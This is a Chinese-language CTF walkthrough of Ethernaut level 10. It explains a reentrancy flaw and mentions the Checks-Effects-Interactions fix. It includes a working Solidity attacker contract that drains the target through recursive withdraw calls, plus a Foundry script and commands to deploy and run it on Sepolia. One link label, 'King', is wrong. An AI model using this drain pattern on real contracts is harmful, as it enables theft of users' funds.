# Level 10

[The Ethernaut level 10](https://ethernaut.openzeppelin.com/level/10)

这一关的要求是获取合约里所有的资金。

仔细阅读这个合约，发现，这是个典型的重入攻击案例。

问题出在 withdraw 方法，在更新余额之前调用了 `msg.sender.call{value: _amount}("")`。这意味着在调用者收到以太币后，调用者仍然有能力再次调用 withdraw 函数（即发生重入），在余额尚未更新之前再进行一次提取。通过这种方式，攻击者可以反复进行 withdraw 操作，把整个合约的余额全部提走。

采用 Checks-Effects-Interactions 模式可以修复这个重入的问题。

攻击合约步骤如下：
1. 捐赠一定数量 ether 给目标合约
2. 编写 receive 函数，接收到 ether 时向目标合约发起 withdraw
3. 准备就绪后，发起 withdraw

示例代码如下：

```
contract Attacker {
    Reentrance target;

    constructor(address targetAddr) public {
        target = Reentrance(payable(targetAddr));
    }

    function attack(uint amount) public {
        target.donate{value: amount}(address(this));
        target.withdraw(amount);
    }

    receive() external payable {
        if (address(target).balance >= msg.value) {
            target.withdraw(msg.value);
        }
    }
}
```

还需要一个脚本去部署 `Attacker` 合约并发起攻击

```
address levelAddr = 0x5506958fC2AB6709357d9cB7F813cfb3a387b5B7;

Attacker attacker = new Attacker(levelAddr);

uint amount = 0.001 ether; // level 合约当前balance
(bool success, ) = address(attacker).call{value: amount}(""); // 先发送 ether 给 attacker
require(success, "fund attacker failed");

attacker.attack(amount);
```

完整代码见：[这里](../../ethernaut/script/level10.s.sol)

Foundry 脚本：

调用脚本部署并发动攻击：
```
forge script script/level10.s.sol:CallContractScript --rpc-url sepolia --broadcast
```

查询当前地址余额
```
cast balance <address> --rpc-url sepolia
```


链上记录：
- [level(`King`) 实例](https://sepolia.etherscan.io/address/0x5506958fC2AB6709357d9cB7F813cfb3a387b5B7)
- [Attacker](https://sepolia.etherscan.io/tx/0x34cA64426b2F010bae810b3dFCb41Dd989598957)
- [attack](https://sepolia.etherscan.io/tx/0xf7a7509d4579e909890cce22d131ae8e7f204f2e2fe8f89a4a3a39af092707a4)
